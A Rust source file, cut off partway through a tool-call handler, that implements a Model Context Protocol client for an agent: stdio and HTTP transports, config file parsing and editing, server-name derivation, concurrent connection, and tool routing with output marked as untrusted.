//! Minimal MCP (Model Context Protocol) client for the agent: connect configured
//! servers, do the `initialize` → `tools/list` handshake, and expose their tools
//! to the engine as `mcp__<server>__<tool>` (the Claude Code naming), routed to
//! `tools/call`. This is the parity move with codex/claude/gemini — it lets the
//! agent use the whole MCP server ecosystem (filesystem, github, …).
//!
//! Transports: stdio (a spawned child, newline-delimited JSON-RPC 2.0) and
//! Streamable HTTP (a `url` server — POST JSON-RPC, reply as `application/json` or
//! an SSE stream, with an `Mcp-Session-Id` echoed after `initialize`). Scope:
//! tools only (no resources/prompts/sampling), sequential calls per server (a
//! mutex around each server's transport). Servers are configured in
//! `~/.config/aivo/mcp.json` and `<cwd>/.mcp.json` (the `mcpServers` object, same
//! shape as Claude Desktop / Cursor): a `command` is stdio, a `url` is HTTP (with
//! optional static `headers`, e.g. a bearer token). Configured servers are trusted
//! by default (their tool calls run without a prompt, since the user opted them
//! in); set `"trust": false` on a server to permission-gate its calls like a
//! dangerous built-in.

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

use futures::StreamExt;
use futures::future::BoxFuture;
use futures::stream::FuturesUnordered;
use serde_json::{Value, json};
use tokio::io::{AsyncBufRead, AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{Child, ChildStdin, ChildStdout, Command};
use tokio::sync::Mutex;

use crate::agent::engine::ExternalTools;

/// Handshake read timeout — generous, since a cold `npx` server downloads its
/// package before answering `initialize`. Connect runs in the background (off the
/// UI thread), so a slow start doesn't freeze anything.
const MCP_HANDSHAKE_TIMEOUT: Duration = Duration::from_secs(60);
/// Tool-call read timeout — longer than the handshake so a genuinely slow tool
/// (web fetch, a query, a build) isn't cut off. Matches run_bash's default.
const MCP_CALL_TIMEOUT: Duration = Duration::from_secs(120);
/// Max interleaved notifications / unrelated ids to skip while awaiting a
/// response before giving up — bounds a chatty or broken server.
const MAX_SKIPPED_MESSAGES: usize = 256;
/// Cap on an MCP tool result's character length (matches the built-in tools'
/// bounded output) so one big result can't swamp the conversation context.
const MAX_MCP_RESULT_CHARS: usize = 30_000;
/// Hard cap on a single MCP response line (bytes), so a server can't OOM us with
/// one giant message. Generous (a large file-read result still fits) but bounded;
/// the extracted text is then capped to MAX_MCP_RESULT_CHARS for the model.
const MCP_MAX_LINE_BYTES: usize = 16 * 1024 * 1024;
/// Same byte cap for a Streamable HTTP response body (an SSE stream or a single
/// JSON body), so a server can't stream/return unbounded into memory before we'd
/// cap the extracted text.
const MCP_MAX_HTTP_BODY_BYTES: usize = 16 * 1024 * 1024;
/// Cap on the bytes read from an error-response body before snippeting it — we
/// only show the first ~300 chars, so there's no need to buffer a huge body.
const MCP_HTTP_ERROR_SNIPPET_BYTES: usize = 64 * 1024;
/// MCP protocol version advertised for the Streamable HTTP transport (in the
/// `initialize` params and the `MCP-Protocol-Version` header on later requests).
/// The Streamable HTTP transport was introduced in this revision; stdio keeps the
/// older `2024-11-05` it has always sent.
const MCP_HTTP_PROTOCOL_VERSION: &str = "2025-03-26";

/// How aivo reaches an MCP server: a spawned child over stdio, or a remote
/// endpoint over Streamable HTTP. Both speak JSON-RPC 2.0; only the way a
/// request/response round-trip is carried differs.
#[derive(Debug, Clone)]
enum Transport {
    Stdio {
        command: String,
        args: Vec<String>,
        env: HashMap<String, String>,
    },
    Http {
        url: String,
        /// Static headers from config (e.g. `Authorization`), sent on every
        /// request. Interactive OAuth bearer tokens will layer in here later.
        headers: Vec<(String, String)>,
    },
}

impl Transport {
    /// The roster/drill-in display target: the launch command (stdio) or the
    /// endpoint URL (http).
    fn display_target(&self) -> String {
        match self {
            Transport::Stdio { command, args, .. } => {
                if args.is_empty() {
                    command.clone()
                } else {
                    format!("{command} {}", args.join(" "))
                }
            }
            Transport::Http { url, .. } => url.clone(),
        }
    }
}

#[derive(Debug, Clone)]
struct ServerConfig {
    transport: Transport,
    /// `false` makes this server's tool calls permission-gated. Default `true`
    /// (an explicitly-configured server is trusted).
    trust: bool,
}

#[derive(Clone)]
struct McpTool {
    name: String,
    description: String,
    input_schema: Value,
}

/// A connected server's transport state, behind the per-server mutex. Both
/// variants carry the JSON-RPC `next_id`; `request`/`notify` dispatch on the
/// variant.
// The variant sizes are close enough on Unix to pass, but cross clippy's
// threshold on Windows (platform-dependent struct layout); boxing either side
// would churn every match arm for no real win on a per-server, low-count enum.
#[allow(clippy::large_enum_variant)]
enum ServerIo {
    Stdio(StdioIo),
    Http(HttpIo),
}

/// stdio transport: the child's pipes plus the live `Child` (kept here so it
/// isn't reaped; killed on drop via `kill_on_drop`).
struct StdioIo {
    stdin: ChildStdin,
    stdout: BufReader<ChildStdout>,
    next_id: u64,
    _child: Child,
}

/// Streamable HTTP transport: one endpoint that answers each POSTed JSON-RPC
/// request with either a single `application/json` body or an SSE stream. The
/// `Mcp-Session-Id` returned by `initialize` is echoed on every later request.
struct HttpIo {
    client: reqwest::Client,
    endpoint: String,
    headers: Vec<(String, String)>,
    session_id: Option<String>,
    next_id: u64,
}

struct McpServer {
    tools: Vec<McpTool>,
    io: Mutex<ServerIo>,
    /// Mirrors `ServerConfig::trust`; `false` → gate this server's tool calls.
    trust: bool,
    /// Set once a call hits a transport failure (timeout / closed pipe / desync).
    /// A hung request's late reply would corrupt the next call's read stream, so
    /// the server is disabled for the rest of the session and further calls
    /// fast-fail instead of each waiting the full call timeout.
    dead: AtomicBool,
}

/// Which config file a server is defined in. The `/mcp` overlay only adds/removes
/// `User` servers (the aivo-global `~/.config/aivo/mcp.json`); a `Project` server
/// from a repo's `.mcp.json` is shown and toggleable but edited via that file, and
/// a `Pack` server is managed by removing/reinstalling its pack.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ServerScope {
    User,
    Project,
    Pack,
}

/// A configured MCP server as it appears in the `/mcp` overlay before (or
/// without) a connection — read straight from the config files, no spawn.
#[derive(Debug, Clone)]
pub struct ConfiguredServer {
    pub name: String,
    /// Display target: the launch command (stdio) or the endpoint URL (http).
    pub command: String,
    pub trust: bool,
    pub scope: ServerScope,
    /// `true` for a remote (`url`) server — carried structurally so consumers
    /// never re-derive the transport kind from the display string.
    pub remote: bool,
}

/// A set of connected MCP servers, offered to the engine as external tools.
/// Each server is held behind an `Arc` so a reconnect (e.g. a `/mcp` toggle) can
/// carry an unchanged server's live connection straight into the new client
/// instead of re-spawning it.
pub struct McpClient {
    servers: HashMap<String, Arc<McpServer>>,
    /// Connect/parse failures as `(source, reason)` — `source` is a server name
    /// for a spawn/handshake failure or a config-file label for a JSON error.
    /// Surfaced to the user so a mis-configured server isn't a silent no-op.
    errors: Vec<(String, String)>,
    /// HTTP servers whose connect failed specifically with a `401` — they need
    /// OAuth. A typed signal (rather than matching the error text) so the UI can
    /// render "needs authorization" and the auto-authorize path fires reliably.
    needs_auth: HashSet<String>,
}

/// One server's outcome, reported incrementally during a connect (see
/// [`McpClient::connect_enabled_with_progress`]) so a UI can update each row as
/// its handshake resolves rather than waiting for the whole set.
#[derive(Clone, Debug)]
pub enum ServerConnectStatus {
    Connected { tools: usize },
    NeedsAuth,
    Failed(String),
}

/// The aivo-global `mcp.json` the `/mcp` overlay reads and writes.
pub fn user_config_path() -> Option<PathBuf> {
    Some(crate::services::paths::config_dir().join("mcp.json"))
}

/// Parse one config file's servers, or empty when it's absent/malformed.
fn read_file_servers(path: &Path) -> HashMap<String, ServerConfig> {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|text| parse_config(&text).ok())
        .unwrap_or_default()
}

/// Every configured server, sorted by name and tagged with its source file
/// (project overriding user on a name clash), without spawning anything. Powers
/// the `/mcp` roster.
pub fn configured_servers(cwd: &Path) -> Vec<ConfiguredServer> {
    configured_servers_from(user_config_path().as_deref(), cwd)
}

/// Inner with the user-file path injected, so a test can isolate from the real
/// `~/.config/aivo/mcp.json`.
fn configured_servers_from(user_path: Option<&Path>, cwd: &Path) -> Vec<ConfiguredServer> {
    let mut map: std::collections::BTreeMap<String, ConfiguredServer> =
        std::collections::BTreeMap::new();
    let mut insert = |servers: HashMap<String, ServerConfig>, scope: ServerScope| {
        for (name, cfg) in servers {
            map.insert(
                name.clone(),
                ConfiguredServer {
                    name,
                    command: cfg.transport.display_target(),
                    trust: cfg.trust,
                    scope,
                    remote: matches!(cfg.transport, Transport::Http { .. }),
                },
            );
        }
    };
    // Same precedence as `load_configs`: packs < user < project.
    if user_path.is_some() {
        for dir in crate::agent::packs::mcp_dirs() {
            insert(read_file_servers(&dir.join(".mcp.json")), ServerScope::Pack);
        }
    }
    if let Some(path) = user_path {
        insert(read_file_servers(path), ServerScope::User);
    }
    insert(
        read_file_servers(&cwd.join(".mcp.json")),
        ServerScope::Project,
    );
    map.into_values().collect()
}

/// The project-scoped STDIO servers from `<cwd>/.mcp.json` — the entries whose
/// `command` aivo would spawn as a local child process. Each item is
/// `(name, "command args…")` for the consent prompt. HTTP (`url`) project servers
/// and ALL user servers are excluded: they don't execute local code, so they're
/// never gated. Empty when there's no project `.mcp.json` or it defines no stdio
/// server. Sorted by name for a stable prompt.
pub fn project_stdio_servers(cwd: &Path) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = read_file_servers(&cwd.join(".mcp.json"))
        .into_iter()
        .filter_map(|(name, cfg)| match cfg.transport {
            Transport::Stdio { command, args, .. } => {
                let display = if args.is_empty() {
                    command
                } else {
                    format!("{command} {}", args.join(" "))
                };
                Some((name, display))
            }
            Transport::Http { .. } => None,
        })
        .collect();
    out.sort_by(|a, b| a.0.cmp(&b.0));
    out
}

/// Read the user `mcp.json` as a JSON object for a read-modify-write, preserving
/// any sibling keys. `Ok(empty)` only when the file is genuinely absent (or
/// blank); `Err` when it exists but is present-but-unparseable (a JSON typo) or
/// isn't a JSON object. Refusing here keeps an `/mcp add`/`rm` from silently
/// overwriting a recoverable config with `{}` plus the one new server — the user
/// repairs the typo first, then retries.
fn read_user_root_for_write(path: &Path) -> Result<serde_json::Map<String, Value>, String> {
    let text = match std::fs::read_to_string(path) {
        Ok(t) => t,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Default::default()),
        Err(e) => return Err(format!("read {}: {e}", path.display())),
    };
    if text.trim().is_empty() {
        return Ok(Default::default());
    }
    let value: Value = serde_json::from_str(&text).map_err(|e| {
        format!(
            "{} is not valid JSON ({e}); fix it first so your existing servers aren't lost",
            path.display()
        )
    })?;
    value
        .as_object()
        .cloned()
        .ok_or_else(|| format!("{} must contain a JSON object", path.display()))
}

async fn write_user_root(path: &Path, root: &serde_json::Map<String, Value>) -> Result<(), String> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| format!("create {}: {e}", parent.display()))?;
    }
    let data = serde_json::to_vec_pretty(&Value::Object(root.clone()))
        .map_err(|e| format!("serialize mcp.json: {e}"))?;
    crate::services::atomic_write::atomic_write_secure(path, data)
        .await
        .map_err(|e| format!("write {}: {e}", path.display()))
}

/// Derive a concise server name from the launch command + args, so the user
/// needn't type a redundant one (`npx -y @modelcontextprotocol/server-filesystem`
/// → `filesystem`). For a known launcher (npx/uvx/docker/…) the name comes from
/// the package/image arg, else from the command itself; path/scope/version and
/// `mcp`/`server` affixes are stripped and the rest sanitized to `[a-z0-9_-]`.
/// Falls back to `server`. The caller de-duplicates against existing names.
pub fn derive_server_name(command: &str, args: &[String]) -> String {
    const LAUNCHERS: &[&str] = &[
        "npx", "npm", "pnpm", "pnpx", "yarn", "bun", "bunx", "uvx", "uv", "pipx", "pip", "node",
        "deno", "python", "python3", "docker", "podman",
    ];
    const SUBCOMMANDS: &[&str] = &["run", "exec", "x", "dlx", "tool"];
    let cmd_base = last_path_segment(command);
    let token = if LAUNCHERS.contains(&cmd_base.as_str()) {
        args.iter()
            .find(|a| !a.starts_with('-') && !SUBCOMMANDS.contains(&a.as_str()))
            .cloned()
            .unwrap_or_else(|| cmd_base.clone())
    } else {
        cmd_base.clone()
    };
    let core = strip_server_affixes(&clean_package_token(&token));
    let name = sanitize_server_name(&core);
    if name.is_empty() {
        "server".to_string()
    } else {
        name
    }
}

fn last_path_segment(s: &str) -> String {
    s.rsplit(['/', '\\']).next().unwrap_or(s).to_string()
}

/// A package/image token reduced to its core: drop the scope path, a `@version`
/// or `:tag` suffix, and a code file extension (`server.js` → `server`).
fn clean_package_token(token: &str) -> String {
    let base = last_path_segment(token);
    let base = base.split(['@', ':']).next().unwrap_or(&base);
    match base.rsplit_once('.') {
        Some((head, ext))
            if !head.is_empty()
                && matches!(
                    ext,
                    "js" | "mjs" | "cjs" | "ts" | "py" | "rb" | "sh" | "exe"
                ) =>
        {
            head.to_string()
        }
        _ => base.to_string(),
    }
}

/// Strip one leading and one trailing `mcp`/`server` affix (case-insensitive),
/// never reducing the token to empty.
fn strip_server_affixes(s: &str) -> String {
    let mut t = s;
    for p in [
        "mcp-server-",
        "mcp_server_",
        "server-mcp-",
        "mcp-",
        "mcp_",
        "server-",
        "server_",
    ] {
        if t.len() > p.len() && t.to_ascii_lowercase().starts_with(p) {
            t = &t[p.len()..];
            break;
        }
    }
    for sfx in [
        "-mcp-server",
        "_mcp_server",
        "-mcp",
        "_mcp",
        "-server",
        "_server",
    ] {
        if t.len() > sfx.len() && t.to_ascii_lowercase().ends_with(sfx) {
            t = &t[..t.len() - sfx.len()];
            break;
        }
    }
    t.to_string()
}

fn sanitize_server_name(s: &str) -> String {
    let mapped: String = s
        .chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' {
                c.to_ascii_lowercase()
            } else {
                '-'
            }
        })
        .collect();
    mapped.trim_matches(['-', '_']).to_string()
}

/// Add (or replace) a server in the user `mcp.json`, leaving other servers and
/// sibling keys untouched. `args` may be empty.
pub async fn add_user_server(name: &str, command: &str, args: &[String]) -> Result<(), String> {
    add_user_server_value(name, &json!({ "command": command, "args": args })).await
}

/// Add a server from a full config `Value` (e.g. a pasted `mcpServers` entry),
/// preserving `env` and any extra fields verbatim.
pub async fn add_user_server_value(name: &str, value: &Value) -> Result<(), String> {
    let path = user_config_path().ok_or("no home directory")?;
    add_value_at(&path, name, value).await
}

/// Add (or replace) a server in the repo `.mcp.json` (project scope, `-p`).
pub async fn add_project_server_value(cwd: &Path, name: &str, value: &Value) -> Result<(), String> {
    add_value_at(&cwd.join(".mcp.json"), name, value).await
}

/// Remove a server from the repo `.mcp.json`. `Ok(false)` if it wasn't there.
pub async fn remove_project_server(cwd: &Path, name: &str) -> Result<bool, String> {
    remove_server_at(&cwd.join(".mcp.json"), name).await
}

async fn add_value_at(path: &Path, name: &str, value: &Value) -> Result<(), String> {
    let mut root = read_user_root_for_write(path)?;
    let servers = root
        .entry("mcpServers".to_string())
        .or_insert_with(|| json!({}));
    let obj = servers
        .as_object_mut()
        .ok_or("\"mcpServers\" in mcp.json is not an object")?;
    obj.insert(name.to_string(), value.clone());
    write_user_root(path, &root).await
}

#[cfg(test)]
async fn add_server_at(
    path: &Path,
    name: &str,
    command: &str,
    args: &[String],
) -> Result<(), String> {
    add_value_at(path, name, &json!({ "command": command, "args": args })).await
}

/// Parse a pasted MCP config block into `(name, config)` pairs (name `None` →
/// derive). Accepts the `{"mcpServers": {…}}` wrapper every README shows, a bare
/// `{"name": {…}}` map, or a single `{"command": …}` / `{"url": …}` object. Both
/// stdio (`command`) and Streamable HTTP (`url`) servers are accepted.
pub fn parse_mcp_json(input: &str) -> Result<Vec<(Option<String>, Value)>, String> {
    let value: Value =
        serde_json::from_str(input.trim()).map_err(|e| format!("invalid JSON ({e})"))?;
    let obj = value
        .as_object()
        .ok_or("expected a JSON object like {\"mcpServers\": { … }}")?;

    // A single bare server config: {"command": …} with no name/wrapper.
    if obj.contains_key("command") || obj.contains_key("url") {
        validate_server_value(&value)?;
        return Ok(vec![(None, value.clone())]);
    }

    // Otherwise a map of name → config, optionally under an `mcpServers` wrapper.
    let map = obj
        .get("mcpServers")
        .and_then(|v| v.as_object())
        .unwrap_or(obj);
    if map.is_empty() {
        return Err("no servers in the pasted config".to_string());
    }
    let mut out = Vec::new();
    for (name, cfg) in map {
        validate_server_value(cfg)?;
        out.push((Some(name.clone()), cfg.clone()));
    }
    Ok(out)
}

/// A pasted server config must be a stdio (`command`) or HTTP (`url`) object.
fn validate_server_value(v: &Value) -> Result<(), String> {
    let obj = v
        .as_object()
        .ok_or("each MCP server must be a JSON object")?;
    if obj.get("command").and_then(|c| c.as_str()).is_some() {
        Ok(())
    } else if let Some(url) = obj.get("url").and_then(|u| u.as_str()) {
        validate_http_url(url)
    } else {
        Err("an MCP server config needs a \"command\" or a \"url\"".to_string())
    }
}

/// An HTTP MCP `url` must be a well-formed http(s) URL.
fn validate_http_url(url: &str) -> Result<(), String> {
    match url::Url::parse(url) {
        Ok(u) if matches!(u.scheme(), "http" | "https") => Ok(()),
        Ok(_) => Err(format!("an MCP server \"url\" must be http(s): {url}")),
        Err(e) => Err(format!("invalid MCP server \"url\" ({e})")),
    }
}

/// The `(command, args)` of a server config `Value`, for deriving a name.
pub fn command_and_args(value: &Value) -> (String, Vec<String>) {
    let command = value
        .get("command")
        .and_then(|c| c.as_str())
        .unwrap_or_default()
        .to_string();
    let args = value
        .get("args")
        .and_then(|a| a.as_array())
        .map(|a| {
            a.iter()
                .filter_map(|x| x.as_str().map(String::from))
                .collect()
        })
        .unwrap_or_default();
    (command, args)
}

/// Derive a name from a pasted server `Value`, handling both stdio (command/args)
/// and HTTP (`url`) configs. The caller de-duplicates against existing names.
pub fn derive_name_from_value(value: &Value) -> String {
    if let Some(url) = value.get("url").and_then(|u| u.as_str()) {
        derive_server_name_from_url(url)
    } else {
        let (command, args) = command_and_args(value);
        derive_server_name(&command, &args)
    }
}

/// Derive a concise name from an MCP endpoint URL: the host with a leading
/// service prefix (`mcp`/`api`/`www`) dropped, then its first label
/// (`https://mcp.notion.com/` → `notion`). Falls back to `server`.
fn derive_server_name_from_url(url: &str) -> String {
    let name = url::Url::parse(url)
        .ok()
        .and_then(|u| u.host_str().map(str::to_string))
        .map(|host| {
            let mut labels = host.split('.').filter(|l| !l.is_empty());
            let first = labels.next().unwrap_or_default();
            let pick = if matches!(first, "mcp" | "api" | "www") {
                labels.next().unwrap_or(first)
            } else {
                first
            };
            sanitize_server_name(pick)
        })
        .unwrap_or_default();
    if name.is_empty() {
        "server".to_string()
    } else {
        name
    }
}

/// Remove a server from the user `mcp.json`. `Ok(false)` if it wasn't there.
pub async fn remove_user_server(name: &str) -> Result<bool, String> {
    let path = user_config_path().ok_or("no home directory")?;
    remove_server_at(&path, name).await
}

/// If `input` is a bare http(s) URL (a remote Streamable HTTP server), the
/// `{url}` JSON config to add for it; `None` for anything else (a `{…}` block
/// or a command line, handled on their own paths). Shared by the `/mcp` add
/// field and `aivo code mcp add`.
pub fn bare_url_to_config(input: &str) -> Option<String> {
    let t = input.trim();
    if t.starts_with("http://") || t.starts_with("https://") {
        let url = t.split_whitespace().next().unwrap_or(t);
        Some(json!({ "url": url }).to_string())
    } else {
        None
    }
}

/// Parse an MCP add line into `(command, args)`, shell-splitting so quoted
/// args/paths survive. The server name is derived from the command (see
/// [`derive_server_name`]), not typed. `Err` is a user-facing message.
pub fn parse_mcp_add_input(input: &str) -> Result<(String, Vec<String>), String> {
    let tokens = shlex::split(input.trim()).unwrap_or_default();
    let Some((command, args)) = tokens.split_first() else {
        return Err(
            "Usage: <command> [args…]  (e.g. npx -y @modelcontextprotocol/server-filesystem ~)"
                .to_string(),
        );
    };
    Ok((command.clone(), args.to_vec()))
}

/// Append `-2`, `-3`, … to `base` until it doesn't collide with an existing name.
pub fn dedupe_name(base: String, existing: &HashSet<String>) -> String {
    if !existing.contains(&base) {
        return base;
    }
    (2..)
        .map(|n| format!("{base}-{n}"))
        .find(|candidate| !existing.contains(candidate))
        .unwrap_or(base)
}

async fn remove_server_at(path: &Path, name: &str) -> Result<bool, String> {
    let mut root = read_user_root_for_write(path)?;
    let removed = root
        .get_mut("mcpServers")
        .and_then(|servers| servers.as_object_mut())
        .is_some_and(|obj| obj.remove(name).is_some());
    if removed {
        write_user_root(path, &root).await?;
    }
    Ok(removed)
}

impl McpClient {
    /// Connect every configured server (best-effort: one that fails to spawn or
    /// handshake is skipped, not fatal). Empty when nothing is configured — the
    /// common case, with zero process spawns.
    pub async fn connect(cwd: &Path) -> McpClient {
        Self::connect_inner(
            user_config_path().as_deref(),
            cwd,
            &HashSet::new(),
            MCP_HANDSHAKE_TIMEOUT,
            None,
            None,
        )
        .await
    }

    /// Like `connect`, but skips servers disabled in `/mcp` and invokes `progress`
    /// with each server's outcome the moment its handshake resolves (servers connect
    /// concurrently), so a UI can flip each row to its real status instead of
    /// showing every server "connecting…" until the slowest one finishes.
    pub async fn connect_enabled_with_progress(
        cwd: &Path,
        disabled: &HashSet<String>,
        progress: impl Fn(String, ServerConnectStatus) + Sync,
    ) -> McpClient {
        Self::connect_inner(
            user_config_path().as_deref(),
            cwd,
            disabled,
            MCP_HANDSHAKE_TIMEOUT,
            Some(&progress),
            None,
        )
        .await
    }

    /// Reconnect for a changed server set (e.g. a `/mcp` toggle), reusing `self`'s
    /// live connections for servers that remain enabled — so toggling one server
    /// doesn't re-spawn (or flash "connecting…" on) the others. Only newly-enabled
    /// servers actually connect, and `progress` fires for those alone; disabled or
    /// removed servers are simply dropped from the result.
    pub async fn reconnect_enabled_with_progress(
        &self,
        cwd: &Path,
        disabled: &HashSet<String>,
        progress: impl Fn(String, ServerConnectStatus) + Sync,
    ) -> McpClient {
        Self::connect_inner(
            user_config_path().as_deref(),
            cwd,
            disabled,
            MCP_HANDSHAKE_TIMEOUT,
            Some(&progress),
            Some(self),
        )
        .await
    }

    /// Test-only: connect reading ONLY `cwd/.mcp.json`, with no real
    /// `~/.config/aivo/mcp.json`, so the suite never depends on — or spawns —
    /// the developer's actually-configured servers.
    #[cfg(test)]
    pub async fn connect_isolated(cwd: &Path, disabled: &HashSet<String>) -> McpClient {
        Self::connect_inner(None, cwd, disabled, MCP_HANDSHAKE_TIMEOUT, None, None).await
    }

    /// Shared by the public entry points. `user_path` is the user-global config
    /// (injectable so a test can pass `None` to isolate from the real one);
    /// `handshake_timeout` is injectable so a test can use a short one against a
    /// deliberately-slow server. Servers connect concurrently; `progress` (when
    /// given) is called as each one resolves so a UI can update per-server. When
    /// `reuse` is set, a still-enabled server that's already live there is carried
    /// over verbatim (no re-spawn, no `progress`).
    async fn connect_inner(
        user_path: Option<&Path>,
        cwd: &Path,
        disabled: &HashSet<String>,
        handshake_timeout: Duration,
        progress: Option<&(dyn Fn(String, ServerConnectStatus) + Sync)>,
        reuse: Option<&McpClient>,
    ) -> McpClient {
        let (configs, mut errors) = load_configs(user_path, cwd);
        let mut servers: HashMap<String, Arc<McpServer>> = HashMap::new();
        let mut needs_auth = HashSet::new();

        // Connect every enabled server concurrently, processing each as it lands
        // (FuturesUnordered yields in completion order) so a slow server can't
        // block a fast one's status.
        let mut pending = FuturesUnordered::new();
        for (name, cfg) in configs {
            if disabled.contains(&name) {
                continue;
            }
            // Carry over an already-live connection from the previous client (a
            // reconnect after a toggle), so an unchanged server keeps its process
            // and its status instead of reconnecting from scratch.
            if let Some(prev) = reuse
                && let Some(existing) = prev.servers.get(&name)
                && !existing.dead.load(Ordering::Relaxed)
            {
                servers.insert(name, Arc::clone(existing));
                continue;
            }
            pending.push(async move {
                let result = connect_server(&name, &cfg, handshake_timeout).await;
                (name, result)
            });
        }
        // Connect errors are gathered separately and appended in name order, so the
        // (concurrent, nondeterministic) completion order doesn't reorder `errors`.
        let mut connect_errors: Vec<(String, String)> = Vec::new();
        while let Some((name, result)) = pending.next().await {
            match result {
                Ok(server) => {
                    if let Some(p) = progress {
                        p(
                            name.clone(),
                            ServerConnectStatus::Connected {
                                tools: server.tools.len(),
                            },
                        );
                    }
                    servers.insert(name, Arc::new(server));
                }
                Err(f) => {
                    if let Some(p) = progress {
                        p(
                            name.clone(),
                            if f.needs_auth {
                                ServerConnectStatus::NeedsAuth
                            } else {
                                ServerConnectStatus::Failed(f.message.clone())
                            },
                        );
                    }
                    if f.needs_auth {
                        needs_auth.insert(name.clone());
                    }
                    connect_errors.push((name, f.message));
                }
            }
        }
        connect_errors.sort_by(|a, b| a.0.cmp(&b.0));
        errors.extend(connect_errors);

        McpClient {
            servers,
            errors,
            needs_auth,
        }
    }

    pub fn has_tools(&self) -> bool {
        self.servers.values().any(|s| !s.tools.is_empty())
    }

    /// Connect/parse failures as `(source, reason)`, for surfacing to the user.
    pub fn errors(&self) -> &[(String, String)] {
        &self.errors
    }

    /// Whether `name`'s connect failed with a `401` (it needs OAuth). Drives the
    /// "needs authorization" status and the auto-authorize-on-add path.
    pub fn needs_auth(&self, name: &str) -> bool {
        self.needs_auth.contains(name)
    }

    /// Whether `name` connected but its transport has since been poisoned (a
    /// crash or stream desync mid-session). Such a server still has tools in the
    /// snapshot, so check this before `tool_count` when deriving health.
    pub fn is_dead(&self, name: &str) -> bool {
        self.servers
            .get(name)
            .is_some_and(|s| s.dead.load(Ordering::Relaxed))
    }

    /// Test-only client with canned failure state.
    #[cfg(test)]
    pub fn with_state_for_tests(
        errors: Vec<(String, String)>,
        needs_auth: HashSet<String>,
    ) -> McpClient {
        McpClient {
            servers: HashMap::new(),
            errors,
            needs_auth,
        }
    }

    /// Any connected server whose transport has since died.
    pub fn any_dead(&self) -> bool {
        self.servers
            .values()
            .any(|s| s.dead.load(Ordering::Relaxed))
    }

    /// Any server waiting on OAuth (`/mcp` → authorize).
    pub fn any_needs_auth(&self) -> bool {
        !self.needs_auth.is_empty()
    }

    /// Tools discovered for `name`, or `None` if that server isn't connected
    /// (disabled, failed, or not yet attempted). Drives the `/mcp` status column.
    pub fn tool_count(&self, name: &str) -> Option<usize> {
        self.servers.get(name).map(|s| s.tools.len())
    }

    /// The tool names `name` exposes (in discovery order), or `None` if that
    /// server isn't connected. Lets the `/mcp` overlay show *which* tools a
    /// server offers, not just the count.
    pub fn tool_names(&self, name: &str) -> Option<Vec<&str>> {
        self.servers
            .get(name)
            .map(|s| s.tools.iter().map(|t| t.name.as_str()).collect())
    }

    /// Each tool `name` exposes as `(tool, description)` pairs (discovery order),
    /// or `None` if that server isn't connected. Drives the `/mcp` drill-in view.
    pub fn tool_details(&self, name: &str) -> Option<Vec<(&str, &str)>> {
        self.servers.get(name).map(|s| {
            s.tools
                .iter()
                .map(|t| (t.name.as_str(), t.description.as_str()))
                .collect()
        })
    }

    /// A rough per-turn token cost for `name`'s tools — they ride on EVERY
    /// request, so a chatty server quietly eats the context window. ~chars/4 of
    /// the advertised tool JSON (name + description + schema, plus per-tool
    /// scaffolding). `None` if the server isn't connected.
    pub fn estimated_tokens(
        &self,
        name: &str,
        disabled: &std::collections::HashSet<String>,
    ) -> Option<usize> {
        self.servers.get(name).map(|s| {
            let chars: usize = s
                .tools
                .iter()
                .filter(|t| !disabled.contains(&qualified_name(name, &t.name)))
                .map(|t| t.name.len() + t.description.len() + t.input_schema.to_string().len() + 24)
                .sum();
            chars / 4
        })
    }

    /// The connect failure for `name`, if it failed to spawn or handshake.
    pub fn error_for(&self, name: &str) -> Option<&str> {
        self.errors
            .iter()
            .find(|(source, _)| source == name)
            .map(|(_, reason)| reason.as_str())
    }

    /// Resolve a fully-qualified `mcp__server__tool` name to its (server, original
    /// tool name) by forward-matching against known tools. Robust even when a
    /// server name itself contains `__` — reverse-parsing the name is not.
    fn lookup(&self, qualified: &str) -> Option<(&McpServer, &str)> {
        self.servers.iter().find_map(|(srv, s)| {
            s.tools
                .iter()
                .find(|t| qualified_name(srv, &t.name) == qualified)
                .map(|t| (s.as_ref(), t.name.as_str()))
        })
    }
}

impl ExternalTools for McpClient {
    fn specs(&self) -> Vec<Value> {
        let mut specs = Vec::new();
        // Dedup by the FINAL (sanitized) name: distinct raw names can collide once
        // sanitized (`a.b` and `a b` both → `a_b`), and duplicate function names
        // make the provider reject the whole request.
        let mut seen = std::collections::HashSet::new();
        for (server, s) in &self.servers {
            for tool in &s.tools {
                let name = qualified_name(server, &tool.name);
                if !seen.insert(name.clone()) {
                    continue;
                }
                specs.push(json!({
                    "type": "function",
                    "function": {
                        "name": name,
                        "description": tool.description,
                        "parameters": tool.input_schema,
                    }
                }));
            }
        }
        specs
    }

    fn handles(&self, name: &str) -> bool {
        self.lookup(name).is_some()
    }

    fn requires_approval(&self, name: &str) -> bool {
        self.lookup(name).is_some_and(|(s, _)| !s.trust)
    }

    fn call<'a>(&'a self, name: &'a str, args: &'a Value) -> BoxFuture<'a, Result<String, String>> {
        Box::pin(async move {
            let (server, tool) = self
                .lookup(name)
                .ok_or_else(|| format!("unknown MCP tool: {name}"))?;
            // A server disabled by an earlier transport failure fast-fails here,
            // before locking — so it can't block on a mutex a hung call still
            // holds, and the model gets an immediate, clear error to route around.
            if server.dead.load(Ordering::Relaxed) {
                return Err(format!(
                    "MCP tool `{name}` is unavailable: its server became unresponsive earlier and was disabled for this session"
                ));
            }
            let tool = tool.to_string();
            let mut io = server.io.lock().await;
            match io
                .request(
                    "tools/call",
                    json!({"name": tool, "arguments": args}),
                    MCP_CALL_TIMEOUT,
                )
                .await
            {
                Ok(result) => {
                    let text = extract_text(&result);
                    if result
                        .get("isError")
                        .and_then(|e| e.as_bool())
                        .unwrap_or(false)
                    {
                        Err(text)
                    } else {
                        // Frame external MCP output as untrusted (prompt-injection).
                        Ok(crate::agent::tools::wrap_untrusted(
                            &format!("mcp:{name}"),
                            &text,
                        ))
                    }
                }
                // The server answered, just with an error — it's healthy, so leave
                // it enabled and surface the error to the model.
                Err(RequestError::Protocol(msg)) => Err(msg),
